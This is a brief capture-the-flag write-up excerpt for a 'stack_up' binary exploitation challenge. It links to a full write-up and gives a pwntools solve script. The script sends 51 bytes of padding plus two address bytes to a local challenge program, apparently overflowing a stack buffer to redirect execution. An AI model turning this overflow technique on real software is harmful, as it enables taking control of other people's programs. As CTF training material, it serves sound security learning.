[FULL OFFICIAL WRITEUP](https://github.com/D13David/ctf-writeups/tree/main/1337uplive/pwn/stack_up)

#### solve.py

```py
from pwn import *

p = process(["runtime", "program.prg"])
p.sendline(b"a"*51 + b"\xbd\xc0")
print(p.readall())
```
